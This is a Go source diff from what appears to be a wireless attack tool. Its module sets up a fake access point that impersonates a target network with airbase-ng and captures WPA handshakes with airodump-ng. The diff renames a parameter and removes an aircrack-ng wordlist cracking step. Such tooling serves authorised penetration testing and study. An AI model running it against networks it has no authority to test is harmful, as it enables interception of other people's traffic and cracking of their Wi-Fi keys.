@@ -19,7 +19,6 @@ type FakeAP struct {
 	Target    *data.Target
 	AP        *exec.Cmd
 	Monitor   *exec.Cmd
-	Crack     *exec.Cmd
 }
 
 // FakeAPModule is a module for creating a fake AP
@@ -36,9 +35,9 @@ type FakeAP struct {
 // The generated commands are stored in the respective fields of the FakeAP struct.
 // The path for storing the captured data and key files is determined based on the ESSID and current timestamp.
 // The function returns the created FakeAP struct and any error encountered during the setup process.
-func NewFakeAP(name string, f *data.Target) (*FakeAP, error) {
+func NewFakeAP(inf string, f *data.Target) (*FakeAP, error) {
 	// If the interface is not in monitor mode, try to set it.
-	mon := exec.Command("sudo", "airmon-ng", "start", name)
+	mon := exec.Command("sudo", "airmon-ng", "start", inf)
 	_ = mon.Run()
 
 	fileInfo, err := os.Stat(AttackBasePath)
@@ -58,16 +57,12 @@ func NewFakeAP(name string, f *data.Target) (*FakeAP, error) {
 	path := path.Join(AttackBasePath, "/", fakeAp.Target.Essid, "/", time.Now().Format("02.01.2006_15:04"))
 
 	// Create the fake AP Command
-	ap := exec.Command("sudo", generateAirbase(fakeAp, name)...)
+	ap := exec.Command("sudo", generateAirbase(fakeAp, inf)...)
 	fakeAp.AP = ap
 
 	// Create the airodump-ng Command
-	dump := exec.Command("sudo", "airodump-ng", "-c", fakeAp.Target.Channel, "-d", fakeAp.Target.Bssid, "-w", path, name)
+	dump := exec.Command("sudo", "airodump-ng", "-c", fakeAp.Target.Channel, "-d", fakeAp.Target.Bssid, "-w", path, inf)
 	fakeAp.Monitor = dump
-
-	// Create the aircrack-ng Command
-	cr := exec.Command("sudo", "aircrack-ng", path+"-cap01.cap", "-l", path+"-key", "-w", AttackBasePath+"/wordlist.txt")
-	fakeAp.Crack = cr
 
 	return fakeAp, err
 }
@@ -85,11 +80,6 @@ func (f *FakeAP) Start() {
 	dumpScan := bufio.NewScanner(dumpOut)
 	monitorAP(dumpScan)
 	f.Handshake = true
-
-	if err := f.Crack.Run(); err == nil {
-		f.Key = true
-		return
-	}
 }
 
 func scanAP(s *bufio.Scanner) {
@@ -115,7 +105,7 @@ func generateAirbase(f *FakeAP, name string) []string {
 	at := []string{"airbase-ng"}
 	bssid := getBssidSlice(f.Target.Bssid)
 	channel := []string{"-c", f.Target.Channel}
-	cipher := getCipherSlice(f.Target.Cipher)
+	cipher := getCipherSlice(f.Target.Privacy)
 	essid := []string{"-e", f.Target.Essid}
 	wep := []string{"-W", "1"}
 
